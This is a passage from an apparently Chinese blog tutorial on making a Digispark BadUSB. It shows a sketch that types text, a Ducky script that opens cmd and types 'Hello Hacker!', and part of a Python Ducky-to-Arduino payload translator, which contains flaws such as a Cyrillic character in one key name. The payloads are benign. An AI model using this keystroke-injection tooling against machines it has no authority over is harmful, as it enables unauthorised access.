</span>&#123;</span><br><span class="line">  <span class="comment">// don&#x27;t need to set anything up to use DigiKeyboard</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// this is generally not necessary but with some older systems it seems to</span></span><br><span class="line">  <span class="comment">// prevent missing the first character after a delay:</span></span><br><span class="line">  DigiKeyboard.sendKeyStroke(<span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// Type out this string letter by letter on the computer (assumes US-style</span></span><br><span class="line">  <span class="comment">// keyboard)</span></span><br><span class="line">  DigiKeyboard.println(<span class="string">&quot;Hello Power_Liu&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// It&#x27;s better to use DigiKeyboard.delay() over the regular Arduino delay()</span></span><br><span class="line">  <span class="comment">// if doing keyboard stuff because it keeps talking to the computer to make</span></span><br><span class="line">  <span class="comment">// sure the computer knows the keyboard is alive and connected</span></span><br><span class="line">  DigiKeyboard.delay(<span class="number">5000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/302.png" alt="图片"></p><p>上传烧录:</p><blockquote><p>提示:Running Digispark Uploader…Plug in device now… (will timeout in 60 seconds)</p></blockquote><p>这个时候需要60s的时间插入你的BadUSB:</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/303.png" alt="图片"></p><p>提示 ： Micronucleus done. Thank you! 说明已经上传成功！这个时候插入BadUSB它会一直输入<code>Hello Power_Liu</code>直到拔掉为止:</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/304.png" alt="图片"></p><h2 id="手把手教你写一个”Hello-Hacker-”"><a href="#手把手教你写一个”Hello-Hacker-”" class="headerlink" title="手把手教你写一个”Hello Hacker!”"></a>手把手教你写一个”Hello Hacker!”</h2><p>1、先在记事本中写好我们的代码 - 另存为 <code>hacker.txt</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//这个代码的意思就是打开cmd，然后输出Hello Hacker!</span><br><span class="line">DELAY 5000</span><br><span class="line">GUI r </span><br><span class="line">DELAY 500</span><br><span class="line">STRING cmd</span><br><span class="line">DELAY 500</span><br><span class="line">ENTER</span><br><span class="line">ENTER</span><br><span class="line">DELAY 1000</span><br><span class="line">STRING Hello Hacker!</span><br><span class="line">DELAY 1500 </span><br><span class="line">ENTER</span><br><span class="line">ENTER</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/305.png" alt="图片"></p><p>2、使用我们的Python转换脚本吧<code>hacker.txt</code>转换为<code>ino</code>文件：</p><blockquote><p>Duckyspark_translator.py hacker.txt hacker</p></blockquote><p>Python转换脚本源代码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">payload_input = <span class="string">&#x27;&#x27;</span></span><br><span class="line">l=<span class="string">&#x27;//&#x27;</span></span><br><span class="line">mod_input=<span class="string">&#x27;&#x27;</span></span><br><span class="line">mod_output=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">replacement</span>():</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;DigiKeyboard.&#x27;</span>, end =<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(</span><br><span class="line"><span class="built_in">str</span>(l.replace(<span class="string">&#x27; a&#x27;</span>, <span class="string">&#x27;KEY_A&#x27;</span>).replace(<span class="string">&#x27; a &#x27;</span>, <span class="string">&#x27;KEY_A&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; b&#x27;</span>, <span class="string">&#x27;KEY_B&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; c&#x27;</span>, <span class="string">&#x27;KEY_C&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; d&#x27;</span>, <span class="string">&#x27;KEY_D&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; e&#x27;</span>, <span class="string">&#x27;KEY_E&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; f&#x27;</span>, <span class="string">&#x27;KEY_F&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; g&#x27;</span>, <span class="string">&#x27;KEY_G&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; h&#x27;</span>, <span class="string">&#x27;KEY_H&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; i&#x27;</span>, <span class="string">&#x27;KEY_I&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; j&#x27;</span>, <span class="string">&#x27;KEY_J&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; k&#x27;</span>, <span class="string">&#x27;KEY_K&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; l&#x27;</span>, <span class="string">&#x27;KEY_L&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; m&#x27;</span>, <span class="string">&#x27;KEY_M&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; n&#x27;</span>, <span class="string">&#x27;KEY_N&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; o&#x27;</span>, <span class="string">&#x27;KEY_O&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; p&#x27;</span>, <span class="string">&#x27;KEY_P&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; q&#x27;</span>, <span class="string">&#x27;KEY_Q&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; r&#x27;</span>, <span class="string">&#x27;KEY_R&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; s&#x27;</span>, <span class="string">&#x27;KEY_S&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; t&#x27;</span>, <span class="string">&#x27;KEY_T&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; u&#x27;</span>, <span class="string">&#x27;KEY_U&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; v&#x27;</span>, <span class="string">&#x27;KEY_V&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; w&#x27;</span>, <span class="string">&#x27;KEY_W&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; x&#x27;</span>, <span class="string">&#x27;KEY_X&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; y&#x27;</span>, <span class="string">&#x27;KEY_Y&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; z&#x27;</span>, <span class="string">&#x27;KEY_Z&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#1-0 if needed</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#f1-f12</span></span><br><span class="line">.replace(<span class="string">&#x27; F1&#x27;</span>,<span class="string">&#x27;KEY_F1&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; F2&#x27;</span>,<span class="string">&#x27;KEY_F2&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; F3&#x27;</span>,<span class="string">&#x27;KEY_F3&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; F4&#x27;</span>,<span class="string">&#x27;KEY_F4&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; F5&#x27;</span>,<span class="string">&#x27;KEY_F5&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; F6&#x27;</span>,<span class="string">&#x27;KEY_F6&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; F7&#x27;</span>,<span class="string">&#x27;KEY_F7&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; F8&#x27;</span>,<span class="string">&#x27;KEY_F8&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; F9&#x27;</span>,<span class="string">&#x27;KEY_F9&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; F10&#x27;</span>,<span class="string">&#x27;KEY_F10&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; F11&#x27;</span>,<span class="string">&#x27;KEY_F11&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; F12&#x27;</span>,<span class="string">&#x27;KEY_F12&#x27;</span>)</span><br><span class="line"><span class="comment">#arrows </span></span><br><span class="line">.replace(<span class="string">&#x27;LEFTARROW&#x27;</span>, <span class="string">&#x27;KEY_ARROW_LEFT&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27;RIGHTARROW&#x27;</span>, <span class="string">&#x27;KEY_ARROW_RIGHT&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27;UPARROW&#x27;</span>,<span class="string">&#x27;KEY_ARROW_UP&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27;DOWNARROW&#x27;</span>,<span class="string">&#x27;KEY_ARROW_DOWN&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27;LEFT&#x27;</span>, <span class="string">&#x27;KEY_ARROW_LEFT&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27;RIGH&#x27;</span>, <span class="string">&#x27;KEY_ARROW_RIGHT&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27;UP&#x27;</span>,<span class="string">&#x27;KEY_ARROW_UP&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27;DOWN&#x27;</span>,<span class="string">&#x27;KEY_ARROW_DOWN&#x27;</span>)</span><br><span class="line"><span class="comment">#keys</span></span><br><span class="line">.replace(<span class="string">&#x27;PRINTSCREEN&#x27;</span>,<span class="string">&#x27;sendKeyStroke(KEY_PRT_SCR&#x27;</span> )</span><br><span class="line">.replace(<span class="string">&#x27;TAB&#x27;</span>, <span class="string">&#x27;sendKeyStroke(KEY_TAB&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27;SPACE&#x27;</span>, <span class="string">&#x27;sendKeyStroke(KEY_SPACE&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27;CONTROL ALT&#x27;</span>,<span class="string">&#x27;sendKeyStroke(MOD_ALT_RIGHT,&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27;CTRL ALT&#x27;</span>,<span class="string">&#x27;sendKeyStroke(MOD_ALT_RIGHT,&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27;ESCAPE&#x27;</span>,<span class="string">&#x27;sendKeyStroke(KEY_ESC&#x27;</span> )</span><br><span class="line">.replace(<span class="string">&#x27;ENTER&#x27;</span>,<span class="string">&#x27;sendKeyStroke(KEY_ENTER&#x27;</span>)),end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;);&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modreplacement</span>():</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;DigiKeyboard.&#x27;</span>, end =<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sendKeyStroke(&#x27;</span>, end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(</span><br><span class="line"><span class="built_in">str</span>(l.replace (mod_input, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27; a&#x27;</span>, <span class="string">&#x27;KEY_A&#x27;</span>).replace(<span class="string">&#x27; a &#x27;</span>, <span class="string">&#x27;KEY_A&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; b&#x27;</span>, <span class="string">&#x27;KEY_B&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; c&#x27;</span>, <span class="string">&#x27;KEY_С&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; d&#x27;</span>, <span class="string">&#x27;KEY_D&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; e&#x27;</span>, <span class="string">&#x27;KEY_E&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; f&#x27;</span>, <span class="string">&#x27;KEY_F&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; g&#x27;</span>, <span class="string">&#x27;KEY_G&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; h&#x27;</span>, <span class="string">&#x27;KEY_H&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; i&#x27;</span>, <span class="string">&#x27;KEY_I&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; j&#x27;</span>, <span class="string">&#x27;KEY_J&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; k&#x27;</span>, <span class="string">&#x27;KEY_K&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; l&#x27;</span>, <span class="string">&#x27;KEY_L&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; m&#x27;</span>, <span class="string">&#x27;KEY_M&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; n&#x27;</span>, <span class="string">&#x27;KEY_N&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; o&#x27;</span>, <span class="string">&#x27;KEY_O&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; p&#x27;</span>, <span class="string">&#x27;KEY_P&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; q&#x27;</span>, <span class="string">&#x27;KEY_Q&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; r&#x27;</span>, <span class="string">&#x27;KEY_R&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; s&#x27;</span>, <span class="string">&#x27;KEY_S&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; t&#x27;</span>, <span class="string">&#x27;KEY_T&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; u&#x27;</span>, <span class="string">&#x27;KEY_U&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; v&#x27;</span>, <span class="string">&#x27;KEY_V&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; w&#x27;</span>, <span class="string">&#x27;KEY_W&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; x&#x27;</span>, <span class="string">&#x27;KEY_X&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; y&#x27;</span>, <span class="string">&#x27;KEY_Y&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; z&#x27;</span>, <span class="string">&#x27;KEY_Z&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#1-0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#f1-f12</span></span><br><span class="line">.replace(<span class="string">&#x27; F1&#x27;</span>,<span class="string">&#x27;KEY_F1&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; F2&#x27;</span>,<span class="string">&#x27;KEY_F2&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; F3&#x27;</span>,<span class="string">&#x27;KEY_F3&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; F4&#x27;</span>,<span class="string">&#x27;KEY_F4&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; F5&#x27;</span>,<span class="string">&#x27;KEY_F5&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; F6&#x27;</span>,<span class="string">&#x27;KEY_F6&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; F7&#x27;</span>,<span class="string">&#x27;KEY_F7&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; F8&#x27;</span>,<span class="string">&#x27;KEY_F8&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; F9&#x27;</span>,<span class="string">&#x27;KEY_F9&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; F10&#x27;</span>,<span class="string">&#x27;KEY_F10&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; F11&#x27;</span>,<span class="string">&#x27;KEY_F11&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; F12&#x27;</span>,<span class="string">&#x27;KEY_F12&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#arrows </span></span><br><span class="line">.replace(<span class="string">&#x27;LEFTARROW&#x27;</span>, <span class="string">&#x27;KEY_ARROW_LEFT&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27;RIGHTARROW&#x27;</span>, <span class="string">&#x27;KEY_ARROW_RIGHT&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27;UPARROW&#x27;</span>,<span class="string">&#x27;KEY_ARROW_UP&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27;DOWNARROW&#x27;</span>,<span class="string">&#x27;KEY_ARROW_DOWN&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27;LEFT&#x27;</span>, <span class="string">&#x27;KEY_ARROW_LEFT&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27;RIGH&#x27;</span>, <span class="string">&#x27;KEY_ARROW_RIGHT&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27;UP&#x27;</span>,<span class="string">&#x27;KEY_ARROW_UP&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27;DOWN&#x27;</span>,<span class="string">&#x27;KEY_ARROW_DOWN&#x27;</span>)</span><br><span class="line"></span><br><span class="line">.replace(<span class="string">&#x27;PRINTSCREEN&#x27;</span>,<span class="string">&#x27;sendKeyStroke(KEY_PRT_SCR&#x27;</span> )</span><br><span class="line">.replace(<span class="string">&#x27;TAB&#x27;</span>, <span class="string">&#x27;sendKeyStroke(KEY_TAB&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27;ESCAPE&#x27;</span>,<span class="string">&#x27;KEY_ESC&#x27;</span> )</span><br><span class="line">.replace(<span class="string">&#x27;SPACE&#x27;</span>, <span class="string">&#x27;KEY_SPACE&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">.replace(<span class="string">&#x27;ENTER&#x27;</span>,<span class="string">&#x27;KEY_ENTER&#x27;</span>)),end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;,&#x27;</span>+mod_output, end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;);&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#arguments</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">2</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">payload_input = <span class="built_in">open</span>(sys.argv[<span class="number">1</span>], <span class="string">&quot;r&quot;</span>)</span><br><span class="line">sys.stdout = <span class="built_in">open</span>(<span class="string">&quot;digipayload.ino&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">z = <span class="built_in">len</span>(<span class="built_in">open</span>(sys.argv[<span class="number">1</span>], <span class="string">&quot;r&quot;</span>).readlines())</span><br><span class="line"><span class="keyword">except</span> IOError:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nError! File &quot;&#x27;</span>+sys.argv[<span class="number">1</span>]+<span class="string">&#x27;&quot; does not exist!\n&#x27;</span> )</span><br><span class="line">exit()</span><br><span class="line"><span class="keyword">elif</span> <span class="built_in">len</span>(sys.argv) == <span class="number">3</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">payload_input = <span class="built_in">open</span>(sys.argv[<span class="number">1</span>], <span class="string">&quot;r&quot;</span>)</span><br><span class="line">sys.stdout = <span class="built_in">open</span>(sys.argv[<span class="number">2</span>]+<span class="string">&#x27;.ino&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">z = <span class="built_in">len</span>(<span class="built_in">open</span>(sys.argv[<span class="number">1</span>], <span class="string">&quot;r&quot;</span>).readlines())</span><br><span class="line"><span class="keyword">except</span> IOError:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nError!, File &quot;&#x27;</span>+sys.argv[<span class="number">1</span>]+<span class="string">&#x27;&quot; does not exist!\n&#x27;</span> )</span><br><span class="line">exit()</span><br><span class="line"><span class="keyword">elif</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">3</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Too much Arguments&#x27;</span>)</span><br><span class="line">exit()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">payload_input = <span class="built_in">open</span>(<span class="string">&#x27;payload.txt&#x27;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">sys.stdout = <span class="built_in">open</span>(<span class="string">&quot;digipayload.ino&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">z = <span class="built_in">len</span>(<span class="built_in">open</span>(<span class="string">&#x27;payload.txt&#x27;</span>, <span class="string">&quot;r&quot;</span>).readlines())</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------------------</span></span><br><span class="line"><span class="comment">#Digispark program fragment</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;//www.liuwx.cn&amp;Qq211124332&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;#include &quot;DigiKeyboard.h&quot;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;#define KEY_ESC     41&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;#define KEY_BACKSPACE 42&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;#define KEY_TAB     43&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;#define KEY_PRT_SCR 70&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;#define KEY_DELETE  76\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;void setup() &#123;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;DigiKeyboard.delay(5000);&#x27;</span>) <span class="comment">#windows mozhet dolgo raspoznavat digispark potomu bylo resheno dobavlyat 5 sek delay vmesto 0.5sek</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;DigiKeyboard.sendKeyStroke(0);&#x27;</span>)</span><br><span class="line"><span class="comment">#---------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(z):</span><br><span class="line">l = payload_input.readline().replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span> (l) &lt; <span class="number">1</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>, end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;REM&#x27;</span> <span class="keyword">in</span> l:</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;//&#x27;</span>, l)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;DELAY&#x27;</span> <span class="keyword">in</span> l:</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;DigiKeyboard.&#x27;</span>, end = <span class="string">&#x27;&#x27;</span>)</span><br><span 